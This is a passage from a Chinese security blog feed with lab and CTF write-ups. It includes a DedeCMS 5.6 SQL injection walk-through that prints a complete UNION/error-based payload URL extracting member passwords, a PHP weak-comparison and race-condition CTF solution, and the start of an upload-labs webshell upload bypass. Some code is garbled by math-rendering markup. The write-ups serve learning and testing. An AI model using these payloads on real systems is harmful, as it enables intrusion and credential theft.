src="/2021/05/17/%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-3%E5%88%99/clip_image082.jpg" alt="img" style="zoom:80%;"><p>这里</p><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>k</mi><mi>e</mi><mi>y</mi><mo>=</mo><mi>s</mi><mi>u</mi><mi>b</mi><mi>s</mi><mi>t</mi><mi>r</mi><mo stretchy="false">(</mo><mi>m</mi><mi>d</mi><mn>5</mn><mo stretchy="false">(</mo></mrow><annotation encoding="application/x-tex">key  = substr(md5(</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.03148em;">k</span><span class="mord mathdefault">e</span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">s</span><span class="mord mathdefault">u</span><span class="mord mathdefault">b</span><span class="mord mathdefault">s</span><span class="mord mathdefault">t</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mopen">(</span><span class="mord mathdefault">m</span><span class="mord mathdefault">d</span><span class="mord">5</span><span class="mopen">(</span></span></span></span>_SERVER[“HTTP_USER_AGENT”].$GLOBALS[‘cfg_cookie_encode’]),8,18);</p><p>可以知道这个代码将 $_SERVER[“HTTP_USER_AGENT”] 和 $GLOBALS[‘cfg_cookie_encode’] 进行拼接，然后进行md5计算之后取前 18 位字符，其中的 <span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mrow></mrow><mi>S</mi></msub><mi>E</mi><mi>R</mi><mi>V</mi><mi>E</mi><mi>R</mi><mo stretchy="false">[</mo><mi mathvariant="normal">&quot;</mi><mi>H</mi><mi>T</mi><mi>T</mi><msub><mi>P</mi><mi>U</mi></msub><mi>S</mi><mi>E</mi><msub><mi>R</mi><mi>A</mi></msub><mi>G</mi><mi>E</mi><mi>N</mi><mi>T</mi><mi mathvariant="normal">&quot;</mi><mo stretchy="false">]</mo><mi mathvariant="normal">是</mi><mi mathvariant="normal">浏</mi><mi mathvariant="normal">览</mi><mi mathvariant="normal">器</mi><mi mathvariant="normal">的</mi><mi mathvariant="normal">标</mi><mi mathvariant="normal">识</mi><mi mathvariant="normal">，</mi><mi mathvariant="normal">我</mi><mi mathvariant="normal">们</mi><mi mathvariant="normal">可</mi><mi mathvariant="normal">以</mi><mi mathvariant="normal">控</mi><mi mathvariant="normal">制</mi><mi mathvariant="normal">这</mi><mi mathvariant="normal">个</mi><mi mathvariant="normal">，</mi><mi mathvariant="normal">如</mi><mi mathvariant="normal">果</mi><mi mathvariant="normal">我</mi><mi mathvariant="normal">们</mi><mi mathvariant="normal">知</mi><mi mathvariant="normal">道</mi></mrow><annotation encoding="application/x-tex">_SERVER[&quot;HTTP_USER_AGENT&quot;] 是浏览器的标识，我们可以控制这个，如果我们知道</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.05764em;">S</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="mord mathdefault" style="margin-right:0.00773em;">R</span><span class="mord mathdefault" style="margin-right:0.22222em;">V</span><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="mord mathdefault" style="margin-right:0.00773em;">R</span><span class="mopen">[</span><span class="mord">&quot;</span><span class="mord mathdefault" style="margin-right:0.08125em;">H</span><span class="mord mathdefault" style="margin-right:0.13889em;">T</span><span class="mord mathdefault" style="margin-right:0.13889em;">T</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.13889em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.13889em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.10903em;">U</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.00773em;">R</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.00773em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">A</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathdefault">G</span><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="mord mathdefault" style="margin-right:0.10903em;">N</span><span class="mord mathdefault" style="margin-right:0.13889em;">T</span><span class="mord">&quot;</span><span class="mclose">]</span><span class="mord cjk_fallback">是</span><span class="mord cjk_fallback">浏</span><span class="mord cjk_fallback">览</span><span class="mord cjk_fallback">器</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">标</span><span class="mord cjk_fallback">识</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">我</span><span class="mord cjk_fallback">们</span><span class="mord cjk_fallback">可</span><span class="mord cjk_fallback">以</span><span class="mord cjk_fallback">控</span><span class="mord cjk_fallback">制</span><span class="mord cjk_fallback">这</span><span class="mord cjk_fallback">个</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">如</span><span class="mord cjk_fallback">果</span><span class="mord cjk_fallback">我</span><span class="mord cjk_fallback">们</span><span class="mord cjk_fallback">知</span><span class="mord cjk_fallback">道</span></span></span></span>GLOBALS[‘cfg_cookie_encode’])怎么生成的话就可以知道key值了</p><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>G</mi><mi>L</mi><mi>O</mi><mi>B</mi><mi>A</mi><mi>L</mi><mi>S</mi><msup><mo stretchy="false">[</mo><mo mathvariant="normal">′</mo></msup><mi>c</mi><mi>f</mi><msub><mi>g</mi><mi>c</mi></msub><mi>o</mi><mi>o</mi><mi>k</mi><mi>i</mi><msub><mi>e</mi><mi>e</mi></msub><mi>n</mi><mi>c</mi><mi>o</mi><mi>d</mi><msup><mi>e</mi><mo mathvariant="normal">′</mo></msup><mo stretchy="false">]</mo><mo stretchy="false">)</mo><mi mathvariant="normal">实</mi><mi mathvariant="normal">际</mi><mi mathvariant="normal">上</mi><mi mathvariant="normal">是</mi></mrow><annotation encoding="application/x-tex">GLOBALS[&#x27;cfg_cookie_encode&#x27;])实际上是</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.001892em;vertical-align:-0.25em;"></span><span class="mord mathdefault">G</span><span class="mord mathdefault">L</span><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="mord mathdefault" style="margin-right:0.05017em;">B</span><span class="mord mathdefault">A</span><span class="mord mathdefault">L</span><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="mopen"><span class="mopen">[</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mord mathdefault">c</span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">c</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathdefault">o</span><span class="mord mathdefault">o</span><span class="mord mathdefault" style="margin-right:0.03148em;">k</span><span class="mord mathdefault">i</span><span class="mord"><span class="mord mathdefault">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">e</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathdefault">n</span><span class="mord mathdefault">c</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mord"><span class="mord mathdefault">e</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mclose">]</span><span class="mclose">)</span><span class="mord cjk_fallback">实</span><span class="mord cjk_fallback">际</span><span class="mord cjk_fallback">上</span><span class="mord cjk_fallback">是</span></span></span></span>rnd_cookieEncode</p><p>$rnd_cookieEncode = chr(mt_rand(ord(‘A’),ord(‘Z’))).chr(mt_rand(ord(‘a’),ord(‘z’))).chr(mt_rand(ord(‘A’),ord(‘Z’))).chr(mt_rand(ord(‘A’),ord(‘Z’))).chr(mt_rand(ord(‘a’),ord(‘z’))).mt_rand(1000,9999).chr(mt_rand(ord(‘A’),ord(‘Z’)));</p><p>可以看到$rnd_cookieEncode所有密匙数为26^6*(9999-1000)=2779933068224，虽然可以暴力破解，但是时间成本太高</p><h3 id="攻击思路"><a class="markdownIt-Anchor" href="#攻击思路"></a> 攻击思路</h3><p>虽然cfg_cookie_encode的生成有一定的规律性，我们可以使用MD5碰撞的方法获得，但是时间成本太高，感觉不太值得。所以想法是在什么地方可以使用 mchStrCode 加密可控参数，并且能够返回到页面中。所以搜索一下全文哪里调用了这个函数。</p><p><strong>在member /buy_action.php中有一个加密调用如下</strong></p><img src="/2021/05/17/%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-3%E5%88%99/clip_image084.jpg" alt="img" style="zoom:80%;"><p>这下面有一句tpl-&gt;LoadTemplate(DEDEMEMBER.’/templets/buy_action_payment.htm’);</p><p>在/templets/buy_action_payment.htm这个文件中，可以看到会回显我们之前加密的 $pr_encode 和 $pr_verify</p><img src="/2021/05/17/%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-3%E5%88%99/clip_image086.jpg" alt="img" style="zoom:80%;"><p>通过这个代码，如果我们提交的是“cfg_dbprefix=SQL注入”的值，就可以从而获取相应的 pr_encode 和 pr_verify</p><p>但是在common.inc.php中会过滤提交的以cfg、GLOBALS、GET、POST、COOKIE 开头的值</p><img src="/2021/05/17/%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-3%E5%88%99/Users\17473\Desktop\博客\红日安全[代码审计]3则\clip_image088.jpg" alt="img" style="zoom:80%;"><p>这个问题的解决就利用到了 $REQUEST 内容与 parse_str 函数内容的差异特性。我们url传入的时候通过**[a=1&amp;b=2%26c=3]这样的提交时， $REQUEST 解析的内容就是 [a=1，b=2%26c=3] 。而通过上面代码的遍历进入 parse_str 函数的内容则是 [a=1&amp;b=2&amp;c=3] ，因为 parse_str 函数会针对传入进来的数据进行解码，所以解析后的内容就变成了[a=1，b=2，c=3]**。所以可以通过这种方法绕过 common.inc.php 文件对于参数内容传递的验证。</p><p>例如构造&amp;a=1%26cfg_dbprefix</p><h3 id="漏洞利用-2"><a class="markdownIt-Anchor" href="#漏洞利用-2"></a> 漏洞利用</h3><p>访问 buy_action.php使用参数如下</p><p>product=card&amp;pid=1&amp;a=1%26cfg_dbprefix=dede_member_operation WHERE 1=@’/!12345union/ select 1,2,3,4,5,6,7,8,9,10 FROM (SELECT COUNT(),CONCAT( (SELECT pwd FROM dede_member LIMIT 0,1),FLOOR(RAND(0)2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a %23</p><p>所以构造url如下</p><p><a href="http://127.0.0.1/DedeCmsV5.6-UTF8-Final/uploads/member/buy_action.php?product=card&amp;pid=1&amp;a=1%26cfg_dbprefix=dede_member_operation">http://127.0.0.1/DedeCmsV5.6-UTF8-Final/uploads/member/buy_action.php?product=card&amp;pid=1&amp;a=1%26cfg_dbprefix=dede_member_operation</a> WHERE 1=@’/!12345union/ select 1,2,3,4,5,6,7,8,9,10 FROM (SELECT COUNT(),CONCAT( (SELECT pwd FROM dede_member LIMIT 0,1),FLOOR(RAND(0)2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a %23</p><img src="/2021/05/17/%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-3%E5%88%99/clip_image090.jpg" alt="img" style="zoom:80%;"><p>然后抓包在进行发送，得到pr_encode 和 pr_verify的值</p><img src="/2021/05/17/%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-3%E5%88%99/clip_image092.jpg" alt="img" style="zoom:80%;"><p>这里我得到</p><p>pd_encode=“QBYKUkVSElkABEcHQ0RQU1gJFgVYBxZSAAM8AVcTF1FfXh0FVAEBU29cAwkBAEc8CkRcRQRMWQsLFmd5IzYmRQReJRMWFlQKA1BQQ15YCQpMRUYGCVFaQ0UJHFZJBRwFSlFPUxlUSQwVDkkJAEQjZH98RkwwIHkmJmAZdCptfjBNHxxyKSogJGFLRRxqcil9czBFRkdVRiIxKnhDAVFdUjpVVQkHU0IRKi0uLGFDVRgIHkl+fCsqZBhjJyonTQVKVx0QT0V+YisoFnl/ICsxKHQ3LHt3aDZ7eCEodx5yLiUxJHY3IGZmZCBsY0QiZH9kNkQhPBUbTFUZFA”</p><p>pd_verify =“de99a6f6445b0a8d931f7b5a99f2cee9”</p><p>所以构造的payload为http://127.0.0.1/DedeCmsV5.6-UTF8-Final/uploads/member/buy_action.php? buy_action.php?pd_encode=QBYKUkVSElkABEcHQ0RQU1gJFgVYBxZSAAM8AVcTF1FfXh0FVAEBU29cAwkBAEc8CkRcRQRMWQsLFmd5IzYmRQReJRMWFlQKA1BQQ15YCQpMRUYGCVFaQ0UJHFZJBRwFSlFPUxlUSQwVDkkJAEQjZH98RkwwIHkmJmAZdCptfjBNHxxyKSogJGFLRRxqcil9czBFRkdVRiIxKnhDAVFdUjpVVQkHU0IRKi0uLGFDVRgIHkl+fCsqZBhjJyonTQVKVx0QT0V+YisoFnl/ICsxKHQ3LHt3aDZ7eCEodx5yLiUxJHY3IGZmZCBsY0QiZH9kNkQhPBUbTFUZFA&amp;pd_verify= de99a6f6445b0a8d931f7b5a99f2cee9</p><h3 id="ctf题目-3"><a class="markdownIt-Anchor" href="#ctf题目-3"></a> CTF题目</h3><p>源码：</p><p>uploadsomething.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>header(<span class="hljs-string">&quot;Content-type:text/html;charset=utf-8&quot;</span>);<br><span class="hljs-variable">$referer</span> = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_REFERER&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$referer</span>)!== <span class="hljs-literal">false</span>) &#123;<br>  <span class="hljs-variable">$savepath</span> = <span class="hljs-string">&quot;uploads/&quot;</span> . sha1(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>]) . <span class="hljs-string">&quot;/&quot;</span>;<br>  <span class="hljs-keyword">if</span> (!is_dir(<span class="hljs-variable">$savepath</span>)) &#123;<br>    <span class="hljs-variable">$oldmask</span> = umask(<span class="hljs-number">0</span>);<br>    mkdir(<span class="hljs-variable">$savepath</span>, <span class="hljs-number">0777</span>);<br>    umask(<span class="hljs-variable">$oldmask</span>);<br>  &#125;<br>  <span class="hljs-keyword">if</span> ((@<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;filename&#x27;</span>]) &amp;&amp; (@<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;content&#x27;</span>])) &#123;<br>    <span class="hljs-comment">//$fp = fopen(&quot;$savepath&quot;.$_GET[&#x27;filename&#x27;], &#x27;w&#x27;);</span><br>    <span class="hljs-variable">$content</span> = <span class="hljs-string">&#x27;HRCTF&#123;y0u_n4ed_f4st&#125;  by:l1nk3r&#x27;</span>;<br>    file_put_contents(<span class="hljs-string">&quot;<span class="hljs-subst">$savepath</span>&quot;</span> . <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;filename&#x27;</span>], <span class="hljs-variable">$content</span>);<br>    <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;Flag is here,come on~ &#x27;</span> . <span class="hljs-variable">$savepath</span> . htmlspecialchars(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;filename&#x27;</span>]) . <span class="hljs-string">&quot;&quot;</span>;<br>    usleep(<span class="hljs-number">100000</span>);<br>    <span class="hljs-variable">$content</span> = <span class="hljs-string">&quot;Too slow!&quot;</span>;<br>    file_put_contents(<span class="hljs-string">&quot;<span class="hljs-subst">$savepath</span>&quot;</span> . <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;filename&#x27;</span>], <span class="hljs-variable">$content</span>);<br>  &#125;<br>  <span class="hljs-keyword">print</span> &lt;&lt;&lt;EOT<br>&lt;form action=<span class="hljs-string">&quot;&quot;</span> method=<span class="hljs-string">&quot;get&quot;</span>&gt;<br>&lt;div class=&quot;form-group&quot;&gt;<br>&lt;label <span class="hljs-keyword">for</span>=<span class="hljs-string">&quot;exampleInputEmail1&quot;</span>&gt;Filename&lt;/label&gt;<br>&lt;input type=&quot;text&quot; class=&quot;form-control&quot; name=&quot;filename&quot; id=&quot;exampleInputEmail1&quot; placeholder=&quot;Filename&quot;&gt;<br>&lt;/div&gt;a<br>&lt;div class=&quot;form-group&quot;&gt;<br>&lt;label <span class="hljs-keyword">for</span>=<span class="hljs-string">&quot;exampleInputPassword1&quot;</span>&gt;Content&lt;/label&gt;<br>&lt;input type=&quot;text&quot; class=&quot;form-control&quot; name=&quot;content&quot; id=&quot;exampleInputPassword1&quot; placeholder=&quot;Contont&quot;&gt;<br>&lt;/div&gt;<br>&lt;button type=&quot;submit&quot; class=&quot;btn btn-default&quot;&gt;Submit&lt;/button&gt;<br>&lt;/form&gt;<br>EOT;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>  <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;you can not see this page&#x27;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><p>Index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span> = <span class="hljs-string">&quot;hongri&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>;<br><span class="hljs-variable">$id</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>];<br>@parse_str(<span class="hljs-variable">$id</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$a</span>[<span class="hljs-number">0</span>] != <span class="hljs-string">&#x27;QNKCDZO&#x27;</span> &amp;&amp; md5(<span class="hljs-variable">$a</span>[<span class="hljs-number">0</span>]) == md5(<span class="hljs-string">&#x27;QNKCDZO&#x27;</span>)) &#123;<br>  <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;a href=&quot;uploadsomething.php&quot;&gt;flag is here&lt;/a&gt;&#x27;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>访问主页，没什么显示的内容</p><img src="/2021/05/17/%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-3%E5%88%99/clip_image094.gif" alt="img" style="zoom:80%;"><p>查看源码发现这里有一处md5比较</p><img src="/2021/05/17/%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-3%E5%88%99/clip_image096.gif" alt="img" style="zoom:80%;"><p>如果正确就会打印出flag的地址，这里使用的是==比较，是弱类型比较，其中有一个漏洞是</p><p>当字符串的开始没有以合法的数值开始，在进行判断时，其值为0</p><p>var_dump(“0e123456”==“0e99999”); //true</p><p>而且本题这里QNKCDZO的md5值为0E830400451993494058024219903391开头是0e，所以只要用另一个0e开头的md5值和它比较，就可以通过了，这里使用了s155964671a，md5值为0e342768416822451524974117254469，构建payload为?id=a[0]=s155964671a</p><p>通过验证，显示出flag的页面</p><img src="/2021/05/17/%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-3%E5%88%99/clip_image098.gif" alt="img" style="zoom:80%;"><p>注意这里有一段代码会验证referer</p><p>$referer = $_SERVER[‘HTTP_REFERER’];</p><p>if(isset($referer)!== false)</p><p>如果不带referer进行访问，就会出现这个界面</p><img src="/2021/05/17/%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-3%E5%88%99/clip_image100.gif" alt="img" style="zoom:80%;"><p>进入flag的页面如下</p><img src="/2021/05/17/%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-3%E5%88%99/clip_image102.gif" alt="img" style="zoom:80%;"><p>这里如果发送了filename和content的数据就会回显一个flag的地址，但是不知道是不是我环境搭的不对，我这里不会显示，但是这里这个文件夹确实建立了，然后flag也在里面</p><img src="/2021/05/17/%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-3%E5%88%99/clip_image104.gif" alt="img" style="zoom:80%;"><p><img src="/2021/05/17/%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-3%E5%88%99/clip_image106.gif" alt="img" style="zoom:80%;"> <img src="/2021/05/17/%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-3%E5%88%99/clip_image108.gif" alt="img" style="zoom:80%;"></p><p>然后观察uploadsomething.php有这段</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> ((@<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;filename&#x27;</span>]) &amp;&amp; (@<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;content&#x27;</span>])) &#123;<br><br>    <span class="hljs-comment">//$fp = fopen(&quot;$savepath&quot;.$_GET[&#x27;filename&#x27;], &#x27;w&#x27;);</span><br><br>    <span class="hljs-variable">$content</span> = <span class="hljs-string">&#x27;HRCTF&#123;y0u_n4ed_f4st&#125;  by:l1nk3r&#x27;</span>;<br><br>    file_put_contents(<span class="hljs-string">&quot;<span class="hljs-subst">$savepath</span>&quot;</span> . <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;filename&#x27;</span>], <span class="hljs-variable">$content</span>);<br><br>    <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;Flag is here,come on~ &#x27;</span> . <span class="hljs-variable">$savepath</span> . htmlspecialchars(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;filename&#x27;</span>]) . <span class="hljs-string">&quot;&quot;</span>;<br><br>    usleep(<span class="hljs-number">100000</span>);<br><br>    <span class="hljs-variable">$content</span> = <span class="hljs-string">&quot;Too slow!&quot;</span>;<br><br>    file_put_contents(<span class="hljs-string">&quot;<span class="hljs-subst">$savepath</span>&quot;</span> . <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;filename&#x27;</span>], <span class="hljs-variable">$content</span>);<br><br>  &#125;<br></code></pre></td></tr></table></figure><p>里面的usleep(100000);会限制时间，过了之后就会把flag覆盖并且写入Too slow</p><p>所以我们必须在flag消失之前访问</p><p>使用burpsuite抓包，然后进行连续发送</p><img src="/2021/05/17/%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-3%E5%88%99/clip_image110.gif" alt="img" style="zoom:80%;"><img src="/2021/05/17/%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-3%E5%88%99/clip_image112.gif" alt="img" style="zoom:80%;"><p>这里设置了发送2000个包，开始攻击，在攻击的时候访问http://192.168.44.3/day7/uploads/42df680fe50964852a5d21b069107fc06b22cd4d/flag即可</p><p>这里成功拿到了flag</p><img src="/2021/05/17/%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-3%E5%88%99/clip_image114.gif" alt="img" style="zoom:80%;"></#%;></p>]]></content>
    
    
    <categories>
      
      <category>web学习</category>
      
      <category>学习</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web学习</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>upload-labs 学习</title>
    <link href="/2021/05/13/upload-labs-%E5%AD%A6%E4%B9%A0/"/>
    <url>/2021/05/13/upload-labs-%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h1 id="upload-labs-学习"><a class="markdownIt-Anchor" href="#upload-labs-学习"></a> upload-labs 学习</h1><h2 id="pass-1"><a class="markdownIt-Anchor" href="#pass-1"></a> Pass-1</h2><p>直接上传webshell，发现报错，提示只能上传.jpg|.png|.gif类型的文件。</p><p><img src="/2021/05/13/upload-labs-%E5%AD%A6%E4%B9%A0/clip_image002.jpg" alt="img"></p><p>先把webshell的后缀改成jpg，然后上传，使用Burp抓包</p><p><img src="/2021/05/13/upload-labs-%E5%AD%A6%E4%B9%A0/clip_image004.jpg" alt="img"></p><p>圈住的地方是上传的文件名字，改成1.php，然后发送</p><p><img src="/2021/05/13/upload-labs-%E5%AD%A6%E4%B9%A0/clip_image006.jpg" alt="img"></p><p>可以看到成功上传了</p><p><img src="/2021/05/13/upload-labs-%E5%AD%A6%E4%B9%A0/clip_image008.jpg" alt="img"></p><p>使用菜刀可以成功连接</p><p><img src="/2021/05/13/upload-labs-%E5%AD%A6%E4%B9%A0/clip_image010.jpg" alt="img"></p><h2 id="pass-2"><a class="markdownIt-Anchor" href="#pass-2"></a> Pass-2</h2><p>同样的方法，先把webshell的后缀改成jpg，然后抓包上传</p><p><img src="/2021/05/13/upload-labs-%E5%AD%A6%E4%B9%A0/clip_image012.jpg" alt="img"></p><p>这次把名字改成2.php，方便区分</p><p><img src="/2021/05/13/upload-labs-%E5%AD%A6%E4%B9%A0/clip_image014.jpg" 